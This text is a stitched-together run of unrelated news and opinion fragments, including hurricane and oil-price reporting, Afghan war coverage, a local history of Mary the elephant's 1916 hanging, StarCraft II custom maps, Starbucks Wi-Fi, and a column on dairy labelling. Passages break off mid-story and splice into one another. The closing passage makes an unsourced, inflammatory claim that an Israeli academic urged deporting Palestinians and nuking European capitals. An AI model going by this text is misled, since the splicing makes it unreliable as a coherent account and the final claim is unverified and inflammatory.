" The greater likelihood of storms brings an increased risk of a landfall . " < ^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^

For a factbox on the impact of big storms [ ID :nN27378096 ] ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ >
In addition to the risk that major hurricanes can pose to about one - quarter of U.S. oil production and more than a 10th of natural gas output offshore in the Gulf of Mexico , this year 's storms could threaten to complicate efforts to combat the environmental disaster of BP Plc's BP.L gushing oil well .
" If we have a severe storm come into the Gulf , my biggest concern is storm surge .
Pushing oil up on land even further , up on beach areas in Mississippi , possibly Alabama , " said Aaron Studwell , chief meteorologist for First Insight Trading in Houston .
He said the surge , or the rush of water on shore , would soil beach areas and further inundate marshes that current surface mediation efforts are trying to protect .
Even if BP 's current " top kill " effort to stop the gushing well works , the oil hanging at and below the surface still needs to be cleaned up before a storm makes it worse , Studwell said .
Government officials said hurricanes will impact the worsening Gulf oil slick depending on the storm 's size , strength and track .
They acknowledged storm surges carrying oil inland is a major concern .
Industry analysts said the hurricane forecast helped push crude oil futures higher .
The front month July NYMEX crude contract CLc1 settled $ 3.04 higher , up 4.25 percent , at $ 74.55 a barrel .
That extended gains in two days to 8.4 percent , the biggest since a two - day advance on August 18 - 19 .
" The NOAA forecast calling for an intense Atlantic hurricane season this year is having an impact on oil futures , with storm premium being factored into prices , " said Phil Streible , senior market strategist for Lind - Waldock in Chicago
The hurricane season officially starts on June 1 and typically peaks between late August and mid-October .
An average Atlantic hurricane season brings 11 tropical storms with six hurricanes , including two major hurricanes , NOAA said .
NOAA forecasters said there was an 85 percent chance of an above - average hurricane season this year as a result of warm water temperatures and winds conducive to storms , but just how active will depend in large part on La Nina .
The weather condition promotes the development of Atlantic storms .
" The main uncertainty in this outlook is how much above normal the season will be .
Whether or not we approach the high end of the predicted ranges depends partly on whether or not La Nina develops this summer , " said Gerry Bell , lead seasonal hurricane forecaster at NOAA 's Climate Prediction Center .
" Conditions are becoming increasingly favorable for La Nina to develop , " he added .
The 2009 season , which had only three hurricanes and was the quietest year since 1997 due in part to the weather anomaly El Nino , followed several years of unusually intense activity that was particularly disruptive to U.S. energy supplies .
Other U.S. weather forecasters , including private and university researchers , also are predicting an active hurricane season .
Private forecaster WSI and Colorado State University 's hurricane - forecasting team estimate the 2010 Atlantic hurricane season to produce at least eight hurricanes , four of them major , posing a heightened threat to the U.S. coastline .
[ ID :nN07108839 ] [ ID:nN2099306 ]
CSU forecasters are expected to ramp up their prediction for the 2010 season in a report due out on June 2 .
" The numbers are going to go up quite high , " William Gray , the hurricane forecast pioneer who founded CSU 's storm research team , said on Wednesday .
" This looks like a hell of a year . "
Despite being off target in recent years , hurricane forecasts are closely watched by energy , insurance and commodities markets .
Interest surged following damaging hurricane seasons in 2004 and 2005 that impacted Florida , the U.S. Gulf Coast and the Gulf of Mexico oil and gas fields .
The guidelines also instruct commanders to coach troops to not “ automatically take the easy safe route when doing so requires the use of standoff weapons or indirect fire , ” and to practice drills “ that include decisions to disengage , as well as decisions to engage . ”
Troops are also told to construct checkpoints more carefully to give more space to maneuver and potentially avoid shooting at vehicles perceived as threatening .
Teams are being sent to stress the new rules to ground units .
General Rodriguez ’s senior enlisted counterpart , Command Sgt. Maj. Darrin J. Bohn , said teams were emphasizing that procedures that made sense in one area would not necessarily work in others , and that local commanders should come up with whatever worked best in their areas .
Ninety Afghan civilians were killed by American and NATO troops during the first four months of the year — almost two and a half times the number during the same period last year — while 100 others were wounded .
The deadliest episode occurred in February when 27 civilians who were mistaken for Taliban fighters were killed by American attack helicopters .
That has abruptly reversed the downward trend that , according to United Nations researchers , began last year after Gen. Stanley A. McChrystal , the overall commander of American and NATO forces , put in place measures to reduce civilian casualties .
Some of the increase can be explained by heightened military operations , but the rise in civilian deaths this year has outpaced the increase in the number of Western troops .
The shootings inflame Afghans , who see them as proof that Western forces operate with impunity .
President Hamid Karzai has been harshly critical of civilian deaths caused by the American military , saying they jeopardize any progress that the military offensive might be making .
Even in thanking American troops during a trip to Bagram Air Base on Saturday , Mr. Karzai again called for caution in their operations , although more obliquely .
“ When you ’re out in the fields in Afghanistan alongside Afghan soldiers , it is like any other society , ” The Associated Press reported Mr. Karzai as saying .
“ There are families .
There are children .
There are women .
There are elderly people .
There are young people and people who are ill .
I ’m sure that you take appropriate and good care of the situation when you face it . ”

UNICOI COUNTY HISTORY
The Hanging of Mary the Elephant
By Hilda Padgett - Erwin , Tennessee , 1996
More than eighty years ago , on September 13 , 1916 , something happened in Erwin , Tennessee that even today causes disagreement among the natives .
Mary the elephant was hanged by a railroad derrick car at the Clinchfield Railroad yard .
The hanging of Mary has been referred to in many writings .
It was a question on a TV quiz show and even the focus of an article in Playboy magazine .
A number of Erwinites would like to have the story buried and forgotten and never heard of again .
There are also a number of people who are interested in the story and would like to know all of the facts .
After all , this actually happened and is part of the history of our town .
My friend , Ruth Pieper , who moved to Erwin nine years ago , has been fascinated with the story .
She has spent much of her time , effort , and money on tracing the history of the Spark 's World Famous Show .
Charles H. Sparks owned the show and it had a reputation in the entertainment world as being a 100 % " Sunday School " Circus .
That is , no short change artist - a clean family entertainment .
Charles Sparks had been in the circus business since the late 1800's .
The circus purchased its first elephant in 1896 .
That was Mary .
She was four years old and four feet high .
At that time the show was a horse and wagon show .
By 1905 , they had grown to railroad transportation with one railroad car .
By 1906 , they had three rail cars ; by 1916 , the show had expanded to fifteen rail cars and five elephants .
In some writings about Mary it is speculated that she was a ' killer elephant ' that had been sold from one circus to another .
That is not true .
Mary had been with the Spark 's circus for twenty years , as their first wild animal .
Charles Sparks and his wife , Addie , were very caring people .
They saw that the animals connected with their show were well cared for .
The trainers were instructed to use ' gentling care . '
The Spark 's show played in Jenkins , Kentucky , then on to St. Paul , Virginia where they connected with the Clinchfield Railroad on September 9 , 1916 .
Late in the summer , Louis Reed , the regular elephant trainer , had to leave the show .
Paul Jacoby , who had previously been the elephant trainer , took over the job .
By the time they got to St. Paul they needed an ' under keeper ' for the elephants .
On Sunday , October 10th or Monday September 11th , Walter " Red " Eldridge was hired as ' under keeper . '
Ruth has spent many hours trying to get the background of Red Eldridge .
His age was estimated as between 23 and 38 years .
He was hired in St. Paul but apparently had no family there .
It was learned that he had been working in a hotel in St.
Paul before he was hired for the circus .
Also , one lead was that he was from Mt. Vernon , Indiana .
That was checked out with no results .
His death certificate did not give names of parents or birthplace .
Ruth would be very interested to learn if anyone knows anything about Red Eldridge .
The circus went from St. Paul to Kingsport where they played on September 12th .
Between shows the elephants were driven to a watering hole .
On the way back to the tent , Mary went for a piece of watermelon beside the road .
Red prodded her sensitive ear with a bull hook and she became enraged .
She grabbed Red with her trunk and threw against a drink stand .
Then she stepped on his head until it was flat .
The people were terrified .
They began screaming , " Kill the elephant ! "
A blacksmith tried , but the guns that day were not powerful enough .
Charlie Sparks soon arrived on the scene and calmed Mary .
Mayor Miller and Sheriff Hickman ' arrested '
Mary and staked her by the county jail where many onlookers came by to see her .
They gave a statement to the Johnson City Staff newspaper that steps would be taken to see that the elephant did not come into contact with the people of Johnson City .
That night , Charlie and Addie Sparks had to make the most difficult decision of their circus careers .
After all those years with Mary they had become so attached to her , but they could n't take a chance that she might harm a circus patron .
They decided to have her destroyed .
But how were they to destroy a 7500 pound elephant ?
Shooting her in four soft spots on her head might have worked but was too risky with the crowd of curiosity seekers that the story attracted .
She was too smart to eat food laced with cyanide .
In 1903 , an elephant [ named Topsy * ] had been electrocuted at Coney Island , with the help of Thomas Edison .
Kingsport or Erwin did not have enough electrical power for an electrocution .
Clinchfield could use two engines to crush Mary , or the derrick could be used for hanging her .
Technically , Mary killed Red in Kingsport , so Sullivan County should be where she met her fate .
The summer of 1916 had torrential rains that caused floods and washouts on the railroad tracks .
Clinchfield would not risk sending its derrick car 80 miles , round trip , north to Kingsport when it might be needed south , over the Blue Ridge Mountains into North Carolina .
Before midnight on September 12th Charlie Sparks made the decision to take Mary to Erwin to be hanged .
That decision would also hang on Erwin the fame of elephant killer for the next 80 years .
Wednesday , September 13th was overcast from several days of rain .
The five elephants were moved from the circus lot to the railroad siding where the hanging was to take place .
It was about 5 PM .
Mary 's foot was chained to the track and the derrick chain put on her neck .
A witness described the derrick chain breaking as she was lifted .
The reason , the ankle chain had not been released .
The witness said he could hear the ankle tendons being torn .
When the chain broke , Mary fell back on the track and was stunned and not able to get up .
They quickly got another chain around her neck and hoisted her into the air once more .
Within a few minutes she was dead .
Mary was buried on railroad property near where she was hanged .
A few people today say they can point to the spot .
No one has ever been allowed to dig up her bones .
The recently - resigned U.S. top commander in Afghanistan told ISAF allies the local insurgency was enhanced since the Obama - led surge .
Karzai ’s best option is negotiating with leaders of opposing militant factions .
General Stanley McChrystal , former commander of the U.S. - led International Security Assistance Force ( ISAF ) , ominously briefed the defense ministers of NATO allies just days before he resigned , Jonathan Owen and Brian Brady reported today at The Independent ( UKI ) .
Documents obtained by the UKI show the COMISAF told coalition allies that the Afghan insurgency is expanding as the Kabul government grows more illegitimate and its security forces are not expanding the reach of Kabul to obtain a monopoly of force :
Sacked U.S. General Stanley McChrystal issued a devastatingly critical assessment of the war against a “ resilient and growing insurgency ” just days before being forced out .
Using confidential military documents , copies of which have been seen by the IoS , the “ runaway general ” briefed defence ministers from NATO and [ ISAF ] earlier this month , and warned them not to expect any progress in the next six months .
During his presentation , he raised serious concerns over levels of security , violence , and corruption within the Afghan administration .
Details of General McChrystal ’s grim assessment of his own strategy ’s current effectiveness emerged as the world ’s most powerful leaders set the Afghan president , Hamid Karzai , a five - year deadline to improve security and governance in his country . [… ]
He pinpointed an “ ineffective or discredited ” Afghan government and a failure by Pakistan “ to curb insurgent support ” as “ critical risks ” to success .
“ Waning ” political support and a “ divergence of coalition expectations and campaign timelines ” are among the key challenges faced , according to the general .
Australian Lieutenant - Colonel David Kilcullen , a former advisor to new COMISAF Gen .
David Petraeus and contributor to dominant counterinsurgency ( COIN ) theory , identified “ four basic problems ” between the status quo and what would be deemed as ‘ success ’ in Afghanistan :
Political : Karzai and the Kabul government Strategic : The Obama Administration ’s deadline Operational : Pakistan government elements supporting the Afghan Taliban ; and Tactical : Lack of resources
In a Sunday interview with Fareed Zakaria at CNN , he identifies that all but # 3 is “ self - inflicted ” .
The UKI report adds sources credit this briefing to the COMISAF ’s forced resignation , as much as the controversial Rolling Stone article released online this week .
That Pres. Obama wants to get the U.S. troops out of Afghanistan , but mask it as a success for the 2012 election :
It was this briefing , according to informed sources , as much as the Rolling Stone article , which convinced Mr Obama to move against the former head of U.S. Special Forces , as costs soar to $ 7bn a month and the body count rises to record levels , because it undermined the White House political team ’s aim of pulling some troops out of Afghanistan in time for the U.S. elections in 2012 .
In addition to being the result of some too - candid comments in a magazine article , the President ’s decision to dispense with his commander was seen by the general ’s supporters as a politically motivated culmination of their disagreements . [… ]
The reality , according to a senior military source , is that General McChrystal ’s candour about the reality of the situation was an obstacle to Mr Obama ’s search for an “ early , face - saving exit ” to help his chances in the 2012 presidential elections .
“ Stan argued for time , and would not compromise .
Rolling Stone provided an excuse for Obama to fire the opposition to his plan without having to win an intellectual argument , ” he said .
General McChrystal knew “ his time was up ” and had been told by White House aides his “ time - frame was all wrong ” , with the general thinking in years while the President was thinking more in months , he added .
The briefing displays that Pres . Obama ’s deadline is not consistent with the conditions on the ground .
It highlights that there is no way to prolong the U.S. - led occupation of Afghanistan without burning large portions of political capital at home or using misinformation to manufacture consent :
General McChrystal ’s presentation to NATO defence ministers and ISAF representatives provided an uncompromising obstacle to Mr. Obama ’s plan to bring troops home in time to give him a shot at a second term , according to senior military sources .
The general was judged to be “ off message ” in his warning to ministers not to expect quick results and that they were facing a “ resilient and growing insurgency ” .
All of these problems faced by ISAF cannot be be solved by this deadline , no one disagrees when they ’re being honest .
“ What makes them a crisis is the deadline , ” Lt. - Col .
Kilcullen added .
“ We ’ve got to fix all these problems by next summer , or we ’re not going to meet the objectives .
And that ’s something that we can do something about , ” he added .
That “ something ” is , of course , removing the deadline , but prolonged war is n’t the same as the perpetual war fantasized by most COINdinistas .
He emphasizes the dynamic of foreign occupation as a self - defeating tactic without aggressive reconciliation with insurgency leadership :
Well , I think — you know , I just wrote another book called Counterinsurgency , which , unlike my first book , takes a very large and perspective look at the 385 or so insurgencies since the end of the Napoleonic wars .
And one of the interesting things about that large body of data is in about 80 percent of cases , the government wins and the insurgents lose .
But if you look at those , you normally find there are two things in common : you ’re fighting in your own country and you ’re willing to negotiate politically .
And if you ’re not fighting in your own country and you are willing to negotiate , you still have a reasonably good chance at success .
But if you ’re not willing to negotiate and you are in somebody else ’s country , you are screwed .
There ’s an anecdotal comparison to the Iraq Surge , he makes , but credits the politicization of Iraqi resistance to the “ strong force ” of the U.S. military presence .
This is wrong .
It was n’t “ just good luck ” that he strawmans a portion of COIN critics with labeling the Sunni awakening , he ’s right .
But it was n’t U.S. military might .
It was one part bribery , another part U.S. allegiance with certain factions to eliminate opposing factions instead of brokering reconciliation and installing leaders of the excessively hierarchical resistance factions in positions of political power .
This does not solve the fundamental problem with the “ objectives ” in Afghanistan , which revolve around bolstering a government deemed as legitimate .
The U.S. strongly opposes Pres. Karzai conducting dialogue with elements of the resistance labeled as ‘ Taliban forces ’ , so he ’s forced to take such productive steps underground , Al Jazeera reported today .
It is meeting with Sirajuddin Haqqani , leader of one of the two strongest resistance factions in Afghanistan , that is vital to breaking such networks from being puppeteered by Pakistani intelligence to prolong conflict .
At the same time , it is genuine cooperation that also combat ’s Pak ’s largest worry : Afghanistan becoming an Indian proxy .
” Pakistani officials say they can deliver the network … into a power - sharing arrangement , ” Jane Perlez , Eric Schmitt and Carlotta Gall reported Thursday at The New York Times ( NYT ) .
Both the Haqqani Network and Quetta Shura — the Afghan Taliban which ruled the territory until being ousted by the 2001 invasion by the Bush Administration ” — are ready to break ties with al - Qa’ida , according to Pak intelligence and military sources .
Gen. Ashfaq Parvez Kayani , chief of the Pak Army , brokered Kabul communication with Quetta Shura leader Mullah Mohammed Omar — who is reportedly in the custody of the Pak government — that involved a 15 - point peace deal offered in March , the NYT added , and that the Haqqanis “ could tell Al Qaeda to move elsewhere because it had been given nine years of protection since 9/11 ” .
“ Afghanistan is a nation , not a state in the conventional sense , ” former Secretary of State Henry Kissinger wrote at The Washington Post .
“ The writ of the Afghan government is likely to run in Kabul and its environs , not uniformly in the rest of the country .
The attainable outcome is likely to be a confederation of semi-autonomous , regions configured largely on the basis of ethnicity , dealing with each other by tacit or explicit understandings .
American counterinsurgency strategy — no matter how creatively applied — cannot alter this reality . ”
He adds that deadlines “ should be abandoned ” because “ our interests coincide substantially with those of many of the regional powers ” , but his logic conflicts with the fact because it ’s in the governments of China , Russia , India and Pakistan for Afghanistan to be stabilized , destabilization to any significant level relating the interests of other governments and people are primarily in the hands of those four governments .
What the hawkish wing of the political science establishment also hates about the naked truth is that :
America is not exceptional and Washington ’s deficiencies — financial , political and moral — make it less able that these other nation - states ;
That a strong relations between Kabul and Tehran are inevitable .
Around 25 % of the five million Dutch nationals who work have planned a day off for June 14 , when the Netherlands plays its debut World Cup football match against Denmark , says tourism research institute NRIT .
The match kicks off at 13.30 Dutch time .
According to Nos tv , Canon , Ernst & Young and Vodafone have already given workers time off to watch the match .
And football fans have set up a website wkkijken.nl to lobby companies into allowing staff to watch the match .
Around one third of the Dutch expect the Netherlands to be eliminated in the quarter finals , while 30 % say the semis .
And 14 % of the Dutch think Oranje will take the title .
Brazil and Argentina can also count on a lot of support from the Dutch , followed by Germany .
The StarCraft II beta has been going on for a while now , and though it has given players the chance to try out the game 's fast - paced RTS action , the beta has also provided an opportunity to play around with the new content editor .
Enterprising map makers have been able to work wonders with the powerful tools provided by the editor , making everything from a version of Tetris to an actual first - person shooter .
Here are some of the best maps so far .
Tetris
Yes , that 's a fully playable version of the ubiquitous falling block puzzle game built out of supply depots .
You control the game with the arrow keys , and it even features a multi- player mode , where the goal is send trash to your opponent 's screen , causing it to fill up .
Smash TV
It may be a bit awkward — controlling a dual - stick shooter with a mouse and keyboard — but someone has attempted to recreate the classic arcade shooter Smash TV .
You control movement with the WASD keys and fire with the mouse , taking out swarms and swarms of enemies .
The creator is hoping to have a playable demo ready by the time map publishing becomes available on Battle .
net .
Wacky Race
We 've all probably wondered at some point just which StarCraft unit is the fastest .
Well , one enterprising map creator has decided to find out once and for all by creating a Mario Kart inspired racing map .
It looks a little goofy , and it's hard not to feel bad for the poor
Thor stuck at the back , but considering this was created the day after the map editor was made available , there 's clearly quite a bit of potential .
Bullet Hell
And the new genres do n't end there .
Someone has also managed to cobble together an actual working , bullet hell - style shoot 'em up , complete with screen - filling attacks and anime - inspired music and visuals .
There even appears to be a power - up system in place , as the little fighter is able to upgrade several times throughout the video .
FPS
Arguably the most impressive map so far is a proof - of - concept that turns the real - time strategy game into a first - person shooter .
According to the creator , the demo currently features " full , seamless 8 - directional WASD movement ; smooth mouselook ; and a gun attack based on a custom traceline function . "
Plus , you get to blow up Zerg in first - person .
Diablo III
And if you can't wait for Blizzard 's other big release , Diablo III , someone has already created a Diablo - inspired map .
It gets the look and style down , with flowing lava and treacherous pathways , but , more importantly , the map features a customized user - interface very similar to what the Diablo series offers .
The sheer range of user - created maps already available is impressive , especially considering the game does n't come out until July 27 .
It 's hard not to get excited to see what will happen when these tools are available to everyone , not just the lucky few who made it into the beta .
WASHINGTON ( Reuters ) - A senior U.S. military commander issued a secret order last year that laid the ground for an escalation of covert operations across the Middle East and the Horn of Africa , officials said on Monday .
General David Petraeus speaks during a news conference at Camp Victory in Baghdad in this January 1 , 2010 file photo .

Issued last September by General David Petraeus , the order authorized an escalation that included boosting military and intelligence assistance to help Yemeni forces strike al Qaeda targets , as well as deployment of more unmanned aerial drones to collect information and track high - value targets .
The order also authorized U.S. Special Operations units to work with local security forces to counter al Qaeda and other threats , a goal Pentagon officials have made no secret of .
As the head of the U.S. military ’s Central Command , Petraeus oversees U.S. wars in Iraq and Afghanistan and plays a major role in planning for any possible military action against Iran over its nuclear program .
The order was first reported by the New York Times , which quoted a document it obtained as saying the goal was to build networks that could “ penetrate , disrupt , defeat or destroy ” al Qaeda and other militant groups as well as “ prepare the environment ” for future attacks by U.S. or local military forces .
The newspaper said the directive also appeared to authorize specific operations in Iran , most likely to gather intelligence about its nuclear program or identify dissident groups that might be useful for any future military offensive .
Some of the covert military operations that followed the secret order have been reported .
These include a September 2009 attack by helicopter - borne Special Operations Forces on a car carrying one of east Africa ’s most wanted al Qaeda militants , Kenyan - born Saleh Ali Saleh Nabhan .
Central Command has been positioning Reaper drones at a base in the Horn of Africa .
Officials said the drones can be used against militants in Yemen and Somalia , and even against pirates who attack ships traversing the Gulf of Aden and the Indian Ocean .
“ They ( the drones ) are part of it but it is much broader than that , ” one U.S. official said of the order .
In February , Defense Secretary Robert Gates authorized $ 150 million in security assistance for Yemen for fiscal 2010 , up from $ 67 million last year .
Officials told Reuters the money would be used in part to bolster Yemen ’s special operations forces to lead an offensive targeting al Qaeda in the Arabian Peninsula , which claimed responsibility for a failed plot to blow up a U.S. passenger plane on Christmas Day .
The group has emerged as one of al Qaeda ’s most active affiliates , and the Obama administration recently took the extraordinary step of authorizing the CIA to kill a leading figure linked to the group -- American - born Muslim cleric Anwar al - Awlaki .

The next edition of the Ubuntu Linux distribution could come with added Google , with rumours circulating that Canonical is looking to replace Mozilla 's Firefox with Google 's Chrome browser .
As reported over on UberGizmo , the next edition of Ubuntu Linux Netbook Remix - a variant of Ubuntu designed specifically for netbook format devices and customised to make the most of the often cramped display resolution available - due for release in October of this year is said to be coming with Google 's Chrome browser in place of the traditional Firefox .
Canonical is a business , and while the operating system is free it still needs to turn a profit - and it's quite likely that Google , keen to get its browser in front of as many eyes as possible , will be willing to pay Canonical for each new user .
Chrome is often lauded for its compact interface - important on a netbook - and speed on low - memory devices , too - which fits well with the netbook remix philosophy .
However , there 's a flaw in the plan : while the Chrome code is technically open source , the truly open source edition is known as Chromium - which is already available as an optional install from Canonical 's official software repositories .
Traditionally , Canonical has avoided distributing any software which does n't conform to a true open source licence with Ubuntu - but has occasionally made exceptions , such as in the case of current default browser Firefox which features open code but requires the user to agree to terms and conditions of use .
So far Canonical has neither confirmed nor denied the rumours , but with early builds of the Ubuntu Netbook Remix 10.10 due shortly it will be interesting to see which browser is featured - and whether Canonical chooses to split its user base , with its desktop editions running Firefox while the netbook remix gets Chrome .
Do you think that Chrome is the perfect fit for netbooks , or if Canonical is looking to ditch Firefox should it be looking to the fully open Chromium instead ?

Two new studies come to somewhat depressing conclusions : that men evolved to be violent and fight off other men , and that we still expect them to be that way .
Advertisement
According to the Economist , Penn State anthropologist David Puts has concluded that " almost all of the traits considered to be masculine - big muscles , facial hair , square jaws , deep voices and a propensity to violence - evolved [...] specifically for their usefulness in fighting off or intimidating other men . "
In some species , the Economist explains , males do n't fight for females , instead developing attractive markers of genetic quality so that females will choose them ( one example of this is the pickup artist 's favorite animal , the peacock ) .
But peacock - style males are usually the same size as or smaller than females , while human males are larger , like gorillas , who tend to fight for mates .
And heavy eyebrows , deep voices , and facial hair may have evolved to scare rivals , while big jaws developed to take a punch .
Puts allows that female preferences may have had something to do with the evolution of these traits , but only insofar as women wanted to have sex with fightin ' men so that their kids would also be awesome fighters .
Puts apparently " emphasises that evolutionary biology is not destiny " and that " in modern societies men and women freely choose their mates " — but a preference for violent or at least competitive men may persist in the form of stereotype .
According to Tom Bartlett of the Chronicle of Higher Education Percolator blog , researchers in a second study taped men and women responding to job interview questions in a modest manner — answering an inquiry about salary expectations , for instance , with the words , " Well , if I should be lucky enough to get the position , I 'm sure you 'd offer me a fair wage . "
When men and women watched the tapes , they both disliked the male applicants more than the female ones , even though they gave the same answers .
Bartlett quotes from the study :
Changes in gender roles that have afforded women more financial independence have not yielded relaxed demands for men .
That is , men are still required to uphold masculine ideals that require chronic exhibitions of strength while avoiding signs of weakness .

" Chronic exhibitions of strength " is a funny way to put it , but also a pretty good formulation of the unrealistic and pointless expectations society has of men .
But lest you think this research is all about men and their problems , Bartlett hastens to point out an earlier study by the same team , which found that women who behave assertively are seen as having poor social skills , and that they 're less likely to be hired even if judged competent ( you mean women ca n't get ahead just by acting like men ? ) .
The Economist mentions that Puts 's study hearkens back " to old stereotypes about violent cavemen battling with clubs while a passive woman , fetching in furs , waits helplessly to see who will win her " — looks like the modern workplace does too .
3 Reasons Why Women Can't Be More Like Men

Of the male modesty and female assertiveness studies , Bartlett writes ,
Is the lesson here that everyone should behave according to gender stereotypes lest they offend potential employers / colleagues / passers - by ?
Let 's say no just because that 's a depressing conclusion .
Instead maybe the takeaway is that men and women have to be aware of those expectations and attempt to walk a line between being true to themselves and conforming to society 's expectations .

But this line - walk is still pretty depressing .
Maybe instead we should be training employers to look beyond stereotypes of how men and women should behave — and reminding everyone that , as Puts says , " evolutionary biology is not destiny . "

Other coffeehouse owners say Wi-Fi detracts from the atmosphere they are trying to foster .
Four Barrel Coffee in San Francisco has no Wi-Fi or power outlets for customer use .
“ We all have had experiences of working at cafes where the laptops just took over , and it started to feel more like a library , ” said Jodi Geren , head of operations for Four Barrel .
“ We just really feel like it ’s important for people to talk to each other . ”
Image Starbucks says its customers will have free access to some paid Web sites , like Zagat , and previews of coming movies .

Those who bring laptops to Starbucks now average an hour of Wi-Fi use , and the company does not expect that the free access and content will make people linger longer , said Stephen Gillett , chief information officer at Starbucks and general manager of a unit called Digital Ventures , which will oversee the new offerings .
He said that Starbucks purposely kept video and music clips short .
The coffee chain is catering in part to people who are out of work and need a place to perfect their résumés or do freelance jobs .
In January , the company announced that same - store sales increased 4 percent after months of steady declines .
Starbucks attributes the improvement , which came before consumer spending rebounded as a whole , in part to its role as an office for the unemployed .
The new partnership with Yahoo , which is called the Starbucks Digital Network , will include an online section on business and careers that will include tools for people searching for jobs or writing résumés , Mr. Gillett said .
“ We expect this to be a very versatile tool for people who are using Starbucks for what we call the third place , between home and work , ” he said .
Customers will also get free access to paid Web sites , like those of The Wall Street Journal and Zagat , free iTunes downloads and previews of not - yet - released movies and albums .
They will see local content based on the coffee shop ’s location , like news from Patch , AOL ’s local news site , check-ins on Foursquare and neighborhood photos on Flickr .
For publishers and Web sites , the free content will serve as a marketing tool , Mr. Gillett said , letting customers sample things they might be willing to pay for later .

What ’s in Play : Trump - Biden healthcare showdown in the spotlight
Posted
The global health crisis is likely to shine an even brighter spotlight on the vast differences on healthcare policy between President Donald Trump and the Democratic nominee Joe Biden .
Here ’s a look at how the two rivals clash on key issues .
At the end of April , the National Milk Producers Federation ( NMPF ) petitioned the Food and Drug Administration ( FDA ) to stop producers of non-dairy food from using terms such as " milk , " " cheese , " " ice- cream , " " sour cream , " and " yogurt " on their product labels .
The NMPF characterizes such labeling as a misappropriation of " traditional dairy terms " and contends that " [ f ] ood labels should clearly and accurately identify the true nature of the food to the consumer .
These companies should not be permitted to represent their products as something they are not . "
The FDA has issued regulations that support the NMPF 's view of words like " milk " and " cheese " and that define such products as essentially dairy in nature .
Furthermore , according to the NMPF petition , the FDA has sent warning letters to producers of dairy - free products accusing them of misbranding food by labeling it with words identified with animal ingredients .
The FDA , in other words , appears to agree with the NMPF 's contention that producers of dairy - free products mislead the public by using such words as " milk " and " cheese " in labeling .
In this column , I will examine the underlying contention that dairy - free milks including Wildwood Soymilk , Almond Breeze Almondmilk or Whole Foods Ricemilk , nondairy cheeses such as Daiya vegan shreds and Follow Your Heart Cream Cheese , and non-dairy ice - creams like So Delicious and Purely Decadent are engaged in misleading the public about the nature of their products .
Accuracy in Labeling : Lacteal Secretions
In its petition to the FDA , the NMPF emphasizes the importance of accuracy in labeling .
The petition states that " [ t ] hese products [ the ones that use " dairy terminology " in various incarnations ] should be relabeled to more accurately describe the nature of the food . . . "
A consumer interested in purchasing cows ' milk , cheese , sour cream , or yogurt , in other words , should be able to understand , when she reads the label and the ingredients on a food product , precisely what she is - and what she is not - purchasing .
Words that falsely connote dairy products thus risk confusing the consumer , according to the NMPF .
Whatever one thinks about dairy products , we should all share the NMPF 's expressed desire that consumers ( of dairy and other packaged items ) fully and accurately understand the nature of the products that they consume .
Most people are busy with their lives and cannot afford to spend time divining the origin of the ingredients in their food .
Accuracy in labeling protects and justifies the trust of consumers , who may not have occasion to think much about what it is that they are purchasing and consuming when they visit the local grocery .
Though one will not likely encounter this precise definition on a container of dairy milk , the NMPF 's petition explains that " the term ' milk ' refers to the lacteal secretion from a mammal . "
The federal regulation defining " milk " states more narrowly that " [ m ] ilk is the lacteal secretion , practically free from colostrum , obtained by the complete milking of one or more healthy cows . "
( Colostrum is the very early lacteal secretion that mammals produce for their newborn young ; it has a different texture and appearance from milk ) .
Cows ' milk , in other words , is the breast milk that a mother cow produces in her body when she gives birth to a baby calf .
This is a familiar process , as human females - also mammals - produce milk when they give birth to baby humans .
Unlike human babies who nurse with their mothers until their mothers are ready to wean them , however , the baby calf on a dairy farm is forcibly removed from his mother 's side while he is still young enough to continue nursing , so that dairy farmers can allow the human population to drink and eat the mother 's lacteal secretions .
( Humans appear to be the only mammals who continue to drink breast milk into adulthood and who routinely feed , at any time in their lives , on the breast milk of a different animal . )
Consumers might rightly wonder what happens to the baby calf after he is taken from his mother .
If he is a boy ( and roughly half of a cow 's babies are boys ) , he will be sold and slaughtered as veal .
If she is a girl , then she will either become veal , like her brothers , or she will be raised to give birth to babies who are taken away from her , so that she too may be forced to provide " lacteal secretions " to satisfy the human population 's demand for dairy products such as lacteal milk , lacteal cheese , lacteal yogurt , lacteal ice - cream , and lacteal sour - cream .
Once a farmer can no longer milk mother and daughter for the quantity of dairy that the populace demands , he considers these females " spent " and sends them to slaughter as well .
The wife of a former dairy farmer describes the cows ' and their calves ' experience as follows :
" I learned that dairy cows have to be bred every year in order to continue to produce milk , and how their calves are taken from them shortly after birth -- they 're lucky if they get colostrum from their mom , which is the first milk that is important for their survival .
While some of the calves are kept as replacement heifers , most of them are sent to slaughter or the veal operations , which is a very short life , and not a happy life ....
The verbalizations made by mother and baby as they bond are just one small aspect of their emotional lives that we humans tear apart .
The mother calls for her baby for many days after they 're separated .
How can such a thing ever be called ' humane ? ' "
Dairy consumers ought to know these things when they purchase dairy milk and its derivatives , yet there is nothing on the labels that would give them a hint of it .

WikiLeaks , the whistleblower website , has , in just three years , gone from a small , secretive organisation to a recognised media player ; breaking stories about corruption , crime and lack of accountability among political and corporate interests .
But it 's also attracting the attention of Internet lawmakers .

Europe vs. the Financial Markets How Serious
Is the EU about Regulation ?
The European Union on Tuesday agreed on an array of measures in an attempt to rein in financial markets , including a tax on financial transactions and regulations on hedge funds .
Whether the measures will ever go into effect , however , remains unclear .
Much may depend on Germany -- and political commitment is tepid at best .
The seventh Israeli radio broadcasted an interview with Professor Martin Van-Crevel , a noted world specialist in low - intensity wars .
Former Professor of the Hebrew University of Jerusalem , Van-Crevel discussed publicly what he has been advocating for years in closed military academic circles in Israel and the United States .
In his view , the continued struggle of the Palestinians will inexhorably lead to the collapse of the State of Israel .
Which is why Tel - Aviv has no choice but to " transfer " the Israeli Arabs and the stateless Palestinians beyond safe borders ( that is , not only outside the 1948 borders but also from the 1976 occupied territories and , ideally , from the West Bank and the Gaza Strip ) .
In the event the Europeans opposed such a transfer , in order to survive Tel Aviv will be forced to destroy the European capitals with nuclear weapons , it being understood that the Europeans will be unable to retaliate without annihilating their Palestinian friends .
“ The Palestinians should all be deported .
The people who strive for this ( the Israeli government ) are waiting only for the right man and the right time .
Two years ago , only 7 or 8 per cent of Israelis were of the opinion that this would be the best solution , two months ago it was 33 per cent , and now , according to a Gallup poll , the figure is 44 percent . ”
